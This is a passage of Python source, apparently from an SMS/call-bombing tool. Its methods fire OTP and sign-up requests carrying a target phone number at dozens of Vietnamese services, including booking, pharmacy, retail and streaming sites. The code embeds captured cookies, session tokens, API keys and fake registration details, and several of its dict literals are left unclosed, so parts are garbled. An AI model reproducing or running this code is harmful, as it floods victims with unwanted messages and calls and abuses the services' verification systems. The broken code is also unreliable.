ESeRzNovQ6k9j7JCYpi7UjZ3iVgdvGBdRH31QbLaM9h72ztmikYt3NaVP4xXtkiVkJu4a_PO-uZaEiYxrl7Q1XCNgTiYpJZkov6SWSG3CvR_C6A_9XXiYBX_1V8Zn2mbWFK5y_9hmLb9WhsU8orXfXl0gM_lcTVxEE-oV21qoSVZSt0bspDzC5jYv17a5Bs2i6hLawKkS9KShQarJZ-DCvPBcBXowtM5zVlwLlFYgfBL7ABgkB1JIdRMRpHxho8to73EG7gbJxdbB2gVOJc6I4Na2MsnDae2nquSS9DG1bgXeeMOSUI9DAhSvQMaFHb21dQiM7nSTIDar2aFex',
                    '__Secure-3PSIDTS': 'sidts-CjEB4E2dkVEV3-CyqKbVdW39EkgpF6jyOY8fS6bjJe4zXS_a4eVaQSfB7yzvVl2XltBQEAA',
                    '__Secure-3PSIDCC': 'AKEyXzUhcNA5jbx4HcFOzZuf5xKqDCY7kIqWnUqPH9OcK2cznTN4DsqnB8N6mLK1KWOnhD42agc',
                },
            json={
                    'phone': sdt,
                },
            data='\n(6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT\x12¤\f03AFcWeA5N20RmwugrYXllw1qNvjZjMw1YM6jNS1uLsQvHNfK7A7-mPD2jAUXtw00ffIH4keDhheR5uEx81NMRq49hMkqK4ks6D5bELOyxwUxFiGciBFSLlFS58zNR8CGGG9OX7rnBPoImKP1mpQXLlCtEym2HF0l84vS2zCwHZB03Mb3CMsDfY0ifAxmD56Wn6_y0wV9uOKCosGpaZsA1UfW8b6y5eWM848ISQFO5zZ8-uWrbA3I570xFnLpyweGdBxV5EhEvUmRFAew8ujF714EYjsfmwwsHFpfVf8jkhrkdU94cfJSCdZ2CCDMybnf3qYQmCOFJbgGD8EgmJoL_hBbkbzxEpPf2vsdl3OdqOrpiwSUz2_wPPxTnh7Ff3XQfA2oGy6971ah6aYNo2wq6H15rX32WOl9vsPMW0bzEShwDEG9UHoBVXNxVzwJEiMrTtVDbFT9zcHsrrx_9VWQfeKG3F6Ls6iUmk_af7kH41i-teLcl4_BiIyv9w_u2rLFSS7zIA-qWOm01tDb36oyyyDmKDJ-CPN4UW-dbwT8nHRDVG5MscfUy-PBByzgX60kMvbPVXiCUjsOcW-m-xAobKW37HtuFzkKQTwWSdLYBQwqtUXjMiUPj1UZEH5qkRCnSlnNxcgZRe4ZgG2jKwXnVLiQFpgkF9rfsPJVTv1aBRqz3JM3K__-ZgbpbUqRXZKlCenebNn4tPIANEDS9TaGM4umKtjPo20jnE7CbZ7Zk2IfR9MXb7uDFskqB-s15h4zX3875Y11fYqj81Ao4Es8GrSe15YuazIPc8VGvRIFqBUilksOqRBDTfK-3LM8fTtWpSUthBxVEqaLKa18ull1vabRBl24TsA82pUjb2WEjTG3nYdTn5iQST913rlHQMDJ-w_PvuKm1nj7pW0vUcoasNW2vjmciOUEdKqr4zVAlFxPHLWq7Rsz3qau4Xd2hCby56gM4T9sH1xxX6_yH56izqQfqgr7M8ekM-AviEXnGz_HXwZBwNkyHXwnEoYbRwn4yFszTm2GTgpJo8UJr8H4TvrEX7c2dny0NEtsI--yGBgGzms7gOjnx70aiaqdWidOfPOfKs95mU9HI_UG502624YTzh7YGL0d9knjdXAJ6di23Ftf9qtaKpOwIwHJFHHjONZ6IHu5vDpaaCxUwCHIqxFgKS7XNuXH8H0-swLtiRD2A0HP01lbCGubHS3qebLy9u77NmzIEUBPJ3m6NloU52JGxupdPSIOVsQM6W-cQU36YEwXR-Ecw9YaSRzfOBKSqP_WE0NEuZ5orXvnM9a310MUccYpqcVL1YIwRSS0t0Mn4XTMCyA7D21yca1uOooGVsqPddCr4GmOBzCCGsbYmgnVWKGlQFJ_EeJMtLA4HBvp-bUThZE3H0tJL6YGb5EU9zvpqSdTNeG8BmVgb2wCJDW3qDXO-0rbUCqYJY6sahGQ0sfm3dJN5zHOqAxhuMdfHvQqg5-q5WkNGMXUyMDALbXwW1IAqqdpHPmk7hGuu6d3pLfwNygJsirGHSxiGK0WBiyJUMtNPyRQAzX4JFd5zV5ff71tDpNjN4Q\x1a\x18Xv-KF0LlBu_a0FJ9I5YSlX5m",
            params={
                    'k': '6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT',
                },
            api_name="CALL_SPACET"
        )

    def send_call_vinpearl(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://booking.vinpearl.com/static/media/otp_lock.26ac1e3e.svg",
            method="GET",
            headers={
                    'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'dnt': '1',
                    'priority': 'i',
                    'referer': 'https://booking.vinpearl.com/vi/login-vpt?callback=vinpearl.com/auth0/sso?redirectUrl=https://vinpearl.com/vi/bo-tui-16-dia-diem-du-lich-ha-long-lam-say-long-du-khach',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'image',
                    'sec-fetch-mode': 'no-cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            cookies={
                    '__cf_bm': 'ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw',
                    '__cfruid': '3f11778af16256a63eb265af0f726daceeb866de-1722350965',
                },
            json={
                    'channel': 'vpt',
                    'username': sdt,
                    'type': 1,
                    'OtpChannel': 1,
                },
            data={
                    'channel': 'vpt',
                    'username': sdt,
                    'type': 1,
                    'OtpChannel': 1,
                },
            api_name="CALL_VINPEARL"
        )

    def send_call_traveloka(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.traveloka.com/api/v2/user/signup",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://www.traveloka.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.traveloka.com/vi-vn/explore/destination/kinh-nghiem-du-lich-ha-long-acc/148029',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-domain': 'user',
                    'x-route-prefix': 'vi-vn',
                },
            cookies={
                    'tv-repeat-visit': 'true',
                    'countryCode': 'VN',
                    'tv_user': '{"authorizationLevel":100,"id":null},
            json={
                    'fields': [],
                    'data': {
                        'userLoginMethod': 'PN',
                        'username': sdt,
                    },
            data={
                    'fields': [],
                    'data': {
                        'userLoginMethod': 'PN',
                        'username': sdt,
                    },
            api_name="CALL_TRAVELOKA"
        )

    def send_call_dongplus(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.dongplus.vn/api/v2/user/check-phone",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'ert': 'DP:f9adae3150090780ee8cfac00fc7cc13',
                    'origin': 'https://dongplus.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://dongplus.vn/user/registration/reg1',
                    'rt': '2024-07-30T22:25:19+07:00',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'mobile_phone': sdt,
                },
            data={
                    'mobile_phone': sdt,
                },
            api_name="CALL_DONGPLUS"
        )

    def send_call_longchau(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'access-control-allow-origin': '*',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'order-channel': '1',
                    'origin': 'https://nhathuoclongchau.com.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://nhathuoclongchau.com.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-channel': 'EStore',
                },
            json={
                    'phoneNumber': sdt,
                    'otpType': 0,
                    'fromSys': 'WEBKHLC',
                },
            data={
                    'phoneNumber': sdt,
                    'otpType': 0,
                    'fromSys': 'WEBKHLC',
                },
            api_name="CALL_LONGCHAU"
        )

    def send_call_longchau1(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'access-control-allow-origin': '*',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'order-channel': '1',
                    'origin': 'https://nhathuoclongchau.com.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://nhathuoclongchau.com.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-channel': 'EStore',
                },
            json={
                    'phoneNumber': sdt,
                    'otpType': 1,
                    'fromSys': 'WEBKHLC',
                },
            data={
                    'phoneNumber': sdt,
                    'otpType': 1,
                    'fromSys': 'WEBKHLC',
                },
            api_name="CALL_LONGCHAU1"
        )

    def send_call_galaxyplay(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.glxplay.io/account/phone/checkPhoneOnly",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi',
                    'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
                    'dnt': '1',
                    'origin': 'https://galaxyplay.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://galaxyplay.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-requested-with': 'XMLHttpRequest',
                },
            json={
                    'app_category': 'app',
                    'app_version': '2.0.0',
                    'app_env': 'prod',
                    'session_id': '03ffa1f4-5695-e773-d0bc-de3b8fcf226d',
                    'client_ip': '14.170.8.116',
                    'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
                    'client_timestamp': '1722356171541',
                    'model_name': 'Windows',
                    'user_id': '',
                    'client_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'event_category': 'account',
                    'on_screen': 'login',
                    'from_screen': 'landing_page',
                    'event_action': 'click',
                    'direct_object_type': 'button',
                    'direct_object_id': 'submit_phone_number',
                    'direct_object_property': sdt,
                    'indirect_object_type': '',
                    'indirect_object_id': '',
                    'indirect_object_property': '',
                    'context_format': '',
                    'profile_id': '',
                    'profile_name': '',
                    'profile_kid_mode': '0',
                    'context_value': {
                        'is_new_user': 1,
                        'new_lp': 0,
                        'testing_tag': [],
                    },
            data={
                    'app_category': 'app',
                    'app_version': '2.0.0',
                    'app_env': 'prod',
                    'session_id': '03ffa1f4-5695-e773-d0bc-de3b8fcf226d',
                    'client_ip': '14.170.8.116',
                    'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
                    'client_timestamp': '1722356171541',
                    'model_name': 'Windows',
                    'user_id': '',
                    'client_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'event_category': 'account',
                    'on_screen': 'login',
                    'from_screen': 'landing_page',
                    'event_action': 'click',
                    'direct_object_type': 'button',
                    'direct_object_id': 'submit_phone_number',
                    'direct_object_property': sdt,
                    'indirect_object_type': '',
                    'indirect_object_id': '',
                    'indirect_object_property': '',
                    'context_format': '',
                    'profile_id': '',
                    'profile_name': '',
                    'profile_kid_mode': '0',
                    'context_value': {
                        'is_new_user': 1,
                        'new_lp': 0,
                        'testing_tag': [],
                    },
            params={
                    'phone': sdt,
                },
            api_name="CALL_GALAXYPLAY"
        )

    def send_call_emartmall(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://emartmall.com.vn/index.php?route=account/register/smsRegister",
            method="POST",
            headers={
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'DNT': '1',
                    'Origin': 'https://emartmall.com.vn',
                    'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'X-Requested-With': 'XMLHttpRequest',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            cookies={
                    'emartsess': '30rqcrlv76osg3ghra9qfnrt43',
                    'default': '7405d27b94c61015ad400e65ba',
                    'language': 'vietn',
                    'currency': 'VND',
                    'emartCookie': 'Y',
                },
            data={
                    'mobile': sdt,
                },
            api_name="CALL_EMARTMALL"
        )

    def send_call_ahamove(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.ahamove.com/api/v3/public/user/login",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi',
                    'content-type': 'application/json;charset=UTF-8',
                    'dnt': '1',
                    'origin': 'https://app.ahamove.com',
                    'priority': 'u=1, i',
                    'referer': 'https://app.ahamove.com/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'mobile': sdt,
                    'country_code': 'VN',
                    'firebase_sms_auth': True,
                },
            data={
                    'mobile': sdt,
                    'country_code': 'VN',
                    'firebase_sms_auth': True,
                },
            api_name="CALL_AHAMOVE"
        )

    def send_call_popeyes(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.popeyes.vn/api/v1/register",
            method="POST",
            headers={
                    'accept': 'application/json',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://popeyes.vn',
                    'ppy': 'CWNOBV',
                    'priority': 'u=1, i',
                    'referer': 'https://popeyes.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-client': 'WebApp',
                },
            json={
                    'phone': sdt,
                    'firstName': 'Nguyễn',
                    'lastName': 'Ngọc',
                    'email': 'th456do1g110@hotmail.com',
                    'password': 'et_SECUREID()',
                },
            data={
                    'phone': sdt,
                    'firstName': 'Nguyễn',
                    'lastName': 'Ngọc',
                    'email': 'th456do1g110@hotmail.com',
                    'password': 'et_SECUREID()',
                },
            api_name="CALL_POPEYES"
        )

    def send_call_hoangphuc(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://hoang-phuc.com/advancedlogin/otp/sendotp/",
            method="POST",
            headers={
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'dnt': '1',
                    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjA5YWE0NzczZGUzM2IxNTciLCJ0ciI6ImFiMWFmYzBkNDUwMTE1Y2U5ZTE0ZjdhZmZmOTI3MTQ5IiwidGkiOjE3MjI0MjU0NDExMDMsInRrIjoiMTMyMjg0MCJ9fQ==',
                    'origin': 'https://hoang-phuc.com',
                    'priority': 'u=1, i',
                    'referer': 'https://hoang-phuc.com/customer/account/create/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'traceparent': '00-ab1afc0d450115ce9e14f7afff927149-09aa4773de33b157-01',
                    'tracestate': '1322840@nr=0-1-4173019-1120237972-09aa4773de33b157----1722425441103',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
                    'x-requested-with': 'XMLHttpRequest',
                },
            cookies={
                    'form_key': 'fm7TzaicsnmIyKbm',
                    'mage-banners-cache-storage': '{},
            data={
                    'action_type': '1',
                    'tel': sdt,
                },
            api_name="CALL_HOANGPHUC"
        )

    def send_call_fmcomvn(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'authorization': 'Bearer',
                    'content-type': 'application/json;charset=UTF-8',
                    'dnt': '1',
                    'origin': 'https://fm.com.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://fm.com.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
                    'x-emp': '',
                    'x-fromweb': 'true',
                    'x-requestid': '00c641a2-05fb-4541-b5af-220b4b0aa23c',
                },
            json={
                    'Phone': sdt,
                    'LatOfMap': '106',
                    'LongOfMap': '108',
                    'Browser': '',
                },
            data={
                    'Phone': sdt,
                    'LatOfMap': '106',
                    'LongOfMap': '108',
                    'Browser': '',
                },
            api_name="CALL_FMCOMVN"
        )

    def send_call_Reebokvn(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://reebok-api.hsv-tech.io/client/phone-verification/request-verification",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'key': '63ea1845891e8995ecb2304b558cdeab',
                    'origin': 'https://reebok.com.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://reebok.com.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'timestamp': '1722425836500',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'phoneNumber': sdt,
                },
            data={
                    'phoneNumber': sdt,
                },
            api_name="CALL_REEBOKVN"
        )

    def send_call_thefaceshop(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://tfs-api.hsv-tech.io/client/phone-verification/request-verification",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'key': 'c3ef5fcbab3e7ebd82794a39da791ff6',
                    'origin': 'https://thefaceshop.com.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://thefaceshop.com.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'timestamp': '1722425954937',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'phoneNumber': sdt,
                },
            data={
                    'phoneNumber': sdt,
                },
            api_name="CALL_THEFACESHOP"
        )

    def send_call_BEAUTYBOX(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'key': 'ac41e98f028aa44aac947da26ceb7cff',
                    'origin': 'https://beautybox.com.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://beautybox.com.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'timestamp': '1722426119478',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'phoneNumber': sdt,
                },
            data={
                    'phoneNumber': sdt,
                },
            api_name="CALL_BEAUTYBOX"
        )

    def send_call_winmart(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api-crownx.winmart.vn/iam/api/v1/user/register",
            method="POST",
            headers={
                    'accept': 'application/json',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'authorization': 'Bearer undefined',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://winmart.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://winmart.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-api-merchant': 'WCM',
                },
            json={
                    'firstName': 'Nguyễn Quang Ngọc',
                    'phoneNumber': sdt,
                    'masanReferralCode': '',
                    'dobDate': '2000-02-05',
                    'gender': 'Male',
                },
            data={
                    'firstName': 'Nguyễn Quang Ngọc',
                    'phoneNumber': sdt,
                    'masanReferralCode': '',
                    'dobDate': '2000-02-05',
                    'gender': 'Male',
                },
            api_name="CALL_WINMART"
        )

    def send_call_medicare(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://medicare.vn/api/otp",
            method="POST",
            headers={
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    'DNT': '1',
                    'Origin': 'https://medicare.vn',
                    'Referer': 'https://medicare.vn/login',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
